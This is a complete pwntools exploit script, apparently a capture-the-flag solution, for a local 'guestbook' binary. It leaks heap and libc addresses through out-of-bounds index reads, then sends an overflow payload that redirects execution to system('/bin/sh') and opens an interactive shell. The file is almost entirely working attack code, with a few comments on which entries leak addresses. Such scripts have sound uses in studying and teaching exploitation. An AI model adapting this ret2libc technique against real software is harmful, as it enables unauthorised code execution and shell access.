from pwn import *


gdbcmds = '''
	b *main+109
	b *readName+51
	b *main+443
	c
	'''
elf = context.binary = ELF("./guestbook")
libc = elf.libc
target = process("./guestbook")
#target = gdb.debug('./guestbook', gdbscript=gdbcmds)

target.recvuntil(b">>>")
target.sendline(b"AABB")
target.recvuntil(b">>>")
target.sendline(b"CCDD")
target.recvuntil(b">>>")
target.sendline(b"EEFF")
target.recvuntil(b">>>")
target.sendline(b"GGHH")

# 6th to leak heap
# 16th to leak random libc addr

target.recvuntil(b">>")
target.sendline(b"1")
target.recvuntil(b">>>")
target.sendline(b"6")
heapLeak = target.recvline()
heapAddr = u32(heapLeak[:4])
print("Heap leak", hex(heapAddr))

target.recvuntil(b">>")
target.sendline(b"1")
target.recvuntil(b">>>")
target.sendline(b"16")
libcLeak = target.recvline()
libcAddr = u32(libcLeak[:4])
print("Libc leak", hex(libcAddr))

libc.address = libcAddr - 0x235e14
payload = b""
payload += p32(heapAddr)*5
payload += b"\x00"*88
payload += p32(heapAddr)*4
payload += b"\x90"*32
payload +=  p32(libc.sym.system)
payload += p32(0x0)
payload += p32(next(libc.search(b"/bin/sh")))

target.recvuntil(b">>")
target.sendline(b"2")
target.recvuntil(b">>>")
target.sendline(b"0")
target.recvuntil(b">>>")
target.sendline(payload)

target.sendline()
target.recvuntil(b">>")
target.sendline(b"3")

target.interactive()
